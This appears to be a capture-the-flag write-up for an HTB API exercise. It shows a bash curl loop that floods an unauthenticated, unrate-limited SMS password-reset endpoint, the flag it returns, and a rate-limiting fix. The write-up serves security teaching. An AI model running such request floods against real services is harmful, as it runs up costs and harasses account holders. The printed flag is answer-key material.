# API4 — Unrestricted Resource Consumption Exercise

**Target:** 154.57.164.78:32705  
**Flag:** `HTB{01de742d8cd942ad682aeea9ce3c5428}`

## Vulnerability

`POST /api/v1/authentication/customers/passwords/resets/sms-otps`

- No authentication required
- No rate limiting
- Each request triggers a paid SMS via external provider

The Swagger description even admitted it: *"The SMS provider charges us a significant amount per message."*

## Attack

Spam the endpoint with a known customer email. Flag returned at request #10 when the server detected abuse threshold.

```bash
TARGET="154.57.164.78:32705"

for i in $(seq 1 100); do
  RESP=$(curl -s -X POST "http://$TARGET/api/v1/authentication/customers/passwords/resets/sms-otps" \
    -H 'Content-Type: application/json' \
    -d '{"Email":"MasonJenkins@ymail.com"}')
  echo "[$i] $RESP"
  echo "$RESP" | grep -q "HTB{" && echo "FLAG FOUND" && break
done
```

## Output
[1] {"SuccessStatus":true}
...
[10] {"flag":"HTB{01de742d8cd942ad682aeea9ce3c5428}"}
FLAG FOUND

## Fix

Rate-limit the endpoint: max 1 SMS per email address per 60 seconds, enforced **before** the external SMS call is made. Applies to any expensive third-party resource — SMS, email, payment gateway, AI API calls.
